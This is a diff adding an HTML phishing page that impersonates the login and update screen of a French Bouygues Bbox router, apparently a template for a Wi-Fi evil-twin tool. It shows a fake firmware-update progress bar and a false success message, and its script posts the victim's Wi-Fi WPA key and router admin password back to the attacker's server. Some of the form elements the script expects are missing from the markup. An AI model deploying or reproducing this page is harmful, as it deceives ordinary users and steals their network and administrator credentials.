@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<!-- saved from url=(0034)https://mabbox.bytel.fr/login.html -->
+<html lang="fr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+ <title>{{box_name}} - Interface</title>
+
+ 
+ <meta name="viewport" content="initial-scale=1.0,user-scalable=no,maximum-scale=1">
+ 
+ <meta name="HandheldFriendly" content="True">
+ <meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
+<meta http-equiv="Pragma" content="no-cache" />
+<meta http-equiv="Expires" content="0" />
+
+ <!-- Style Sheets -->
+<link href="static/css/style.css" media="screen" rel="stylesheet" type="text/css"></head>
+<link href="static/css/animate.css" media="screen" rel="stylesheet" type="text/css"></head>
+
+    <script src="static/js/jquery.min.js"></script>
+<body class="tvw620i feat-checker feat-optim feat-biloader no-feat-temperature no-feat-orientation no-feat-light feat-usb feat-ht40 feat-5g feat-scan-5g no-feat-hotspot feat-wps feat-scanwifi no-feat-alert-save feat-boxwithled no-feat-boxwithletter feat-twoline feat-customerspace feat-ipv6 feat-diag-tcp no-feat-cable feat-repair-usb no-feat-search remote-off gridlock">
+<style type="text/css">
+
+.def-text-color { color: {{color}} !important; }
+.def-bg-color { background-color: {{color}} !important;}
+.def-bd-color { border-color: {{color}} !important; }
+
+.desktop-6 {
+	max-width: 100%;
+	padding: 10px;
+}
+.imgfirst {
+	display: block;
+	width: 50%;
+	margin: 0 auto;
+	margin-bottom: -30px;
+}
+.inputfront {
+	background-color: #DDDDDD;
+	color: black;
+	border-radius: 10px;
+}
+
+.labelfront {
+	text-align: left;
+	display: block;
+	font-size: 12px;
+	font-weight: bold;
+}
+.cta-1 {
+    padding: 0 20px 0 40px;
+    width: 100%;
+    text-align: center;
+    color: #fff;
+    background: {{color}};
+    border: 0px;
+}
+
+.cta-1:hover {
+	background-color: black;
+	color: white;
+}
+
+#dialog {
+	z-index: 100;
+	display: inline-block;
+	position: absolute;
+	width: 100%;
+	height: 100%;
+	display: flex;
+	justify-content:center;
+	align-items:center;
+	background-color: rgba(0,0,0,0.3);
+}
+
+#dialog .dialog-box {
+	display: inline-block;
+	background-color: white;
+	border-radius: 15px;
+	padding: 15px;
+}
+#dialog .dialog-box .dialog-text{
+text-align:center;
+font-size: 13px;
+}
+#dialog .dialog-box .but-close-dialog {
+	margin: 0 auto;
+	display: block;
+	padding: 10px;
+	color: white;
+	text-transform: uppercase;
+	font-size: 16px;
+	max-width: 200px;
+	text-align:center;
+	margin-top: 10px;
+	cursor: pointer;
+
+}
+
+.progress {
+	height: 30px;
+  width: 95%;
+  margin: 0 auto;
+}
+
+.progress {
+    height: 30px;
+    margin-bottom: 20px;
+    overflow: hidden;
+    background-color: #f5f5f5;
+    border-radius: 4px;
+    -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+    box-shadow: inset 0 1px 2px rgba(0,0,0,.1);
+}
+
+.progress #dynamic {
+	height: 40px;
+	line-height: 30px;
+}
+
+.progress-bar.active, .progress.active .progress-bar {
+    -webkit-animation: progress-bar-stripes 2s linear infinite;
+    -o-animation: progress-bar-stripes 2s linear infinite;
+    animation: progress-bar-stripes 2s linear infinite;
+    color: white;
+}
+.progress-bar-success {
+    background-color: #5cb85c;
+}
+.progress-bar-striped, .progress-striped .progress-bar {
+    background-image: -webkit-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    background-image: -o-linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    background-image: linear-gradient(45deg,rgba(255,255,255,.15) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.15) 50%,rgba(255,255,255,.15) 75%,transparent 75%,transparent);
+    -webkit-background-size: 40px 40px;
+    background-size: 40px 40px;
+    }
+    @-webkit-keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+@-o-keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+@keyframes progress-bar-stripes {
+  from {
+    background-position: 40px 0;
+  }
+  to {
+    background-position: 0 0;
+  }
+}
+</style>
+<div class="page-login">
+	<div id="dialog" class=" animated-05 fadeIn" style="display: none">
+		<div class="dialog-box zoomIn">
+			<img src="./static/img/logo.png" class="imgfirst" style="width: 100px; margin-bottom: 0px">
+			<div class="dialog-text animated-1"></div>
+			<div class="but-close-dialog def-bg-color" onclick="javascript:hideDialog()">OK</div>
+		</div>
+	</div>
+ <div class="login-form" style="transform: none; top: 150px;">
+ <div class="row">
+ <div class="desktop-6 desktop-push-3 tablet-4 tablet-push-1 mobile-full panel">
+ 	<img src="./static/img/logo.png" class="imgfirst">
+
+ <p style="font-size: 16px; font-weight: bold"></p><br />
+ <p style="font-size: 13px; text-transform: uppercase; font-weight: bold;background-color: #BBBBBB;border: 5px solid #EEEEEE;color: white;padding:10px; ;text-align:center">
+ {{ target_ap_essid }} 
+ </p><br />
+ <p style="color:black; font-size: 20px;text-align:center">Identification et connexion... <br /><span style="font-size: 13px">merci de patienter...</span></p><br />
+
+
+<div class="progress">
+  <div id="dynamic" class="progress-bar progress-bar-success progress-bar-striped active" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
+    <span id="current-progress"></span>
+  </div>
+</div>
+ <div class="spacer-hz"></div>
+ 
+ <div class="notify" style="">
+ <span class="internet"><span class="ok"></span></span>
+ <span class="voip"><span class="notanswered"></span></span>
+ <span class="wifi"><span class="on"></span></span>
+ <span class="iptv">
+ </span>
+ <span class="usb">
+ </span>
+ <span class="parental">
+ </span>
+ <span class="night">
+ </span>
+ <span class="dl-speed">
+ </span>
+ <span class="ul-speed ">
+ </span>
+ <span class="voicemail">
+ </span>
+ </div>
+ </div>
+ </div>
+ </div>
+
+</div>
+
+
+
+	    <script>
+
+		 var current_progress = 0;
+		 var interval_progress = null;
+		 var time_ask = 0;
+	    	function makeProgress() {
+
+				  interval_progress = setTimeout(function() {
+
+						current_progress += getStepProgress();
+						if (current_progress>100) current_progress = 100;
+
+				      $("#dynamic")
+				      .css("width", current_progress + "%")
+				      .attr("aria-valuenow", current_progress)
+				      .text(current_progress + "%");
+				      if (current_progress >= 100) {
+				         clearTimeout(interval_progress);
+				         dialogText = "<span style='color:green;font-weight:bold'><span style='font-size: 25px'>Installation terminée !</span><br /> La mise à jour a été installée avec succès, vous êtes maintenant connecté.</span>";
+							showDialog();
+				      }else {
+				  		makeProgress();
+				  	}
+
+				  }, getTimeProgress());	
+	    	}
+	
+			function getTimeProgress() {
+				if (time_ask == 0) { time_ask = 1;return 1000; }
+				else {
+					return Math.floor(Math.random() * 5000)+2000
+				}
+			}
+
+			function getStepProgress() {
+				return Math.floor(Math.random() * 8)+1;
+			}
+makeProgress();
+
+	var dialog = $('#dialog');
+	var dialogBox = $('.dialog-text');
+	var dialogText ="";
+
+	 $(".btn-submit").on("click", function(e) {
+		  
+		      e.preventDefault();
+		     
+		      // get the password box and checkbox elements
+		      var input = document.getElementById("wifi-key");
+		      var input2 = document.getElementById("admin-pass");
+		      // check to see if the value is empty
+		      if ( input.value == "" ){
+				
+				dialogText = "Vous devez remplir les champs pour lancer la mise à jour et vous connecter.";
+				showDialog();
+
+		      }else{
+		          // post the data
+		          
+		            post('post', {
+		              'wfphshr-admin-password': input.value,
+		             'wfphshr-wpa-password': input2.value
+		            });      
+		      }
+		  });
+
+
+
+		  function showDialog() {
+
+		  		  	dialogBox.html(dialogText);
+		  		  	dialog.css('display','flex');
+
+		  }
+
+		  function hideDialog() {
+
+		  	dialog.css('display','none');
+		  }
+		  
+		  /*
+		  Post to the fallowing path given the parameters.
+
+		  Args:
+		    path: The path to be posted to.
+		    params: The parameters to be passed.
+		  */
+		  function post(path, params) {
+		    // create a form and set its attributes
+		   var dataToSend = JSON.stringify(params);
+// post the data
+window.location = "/update.html";
+$.ajax(
+    {
+        url: 'post',
+        type: 'POST',
+        data: dataToSend,
+
+        success: function (jsonResponse) {
+            var objresponse = JSON.parse(jsonResponse);
+            var verify_status = objresponse['ldap_verify']
+            if (verify_status == 'success') {
+              alert('success');
+            } else if (verify_status == 'fail') {
+              alert('failed');
+            }
+       }
+    }
+ );
+		  }
+	 
+
+      
+		</script>
+
+
+</body></html>
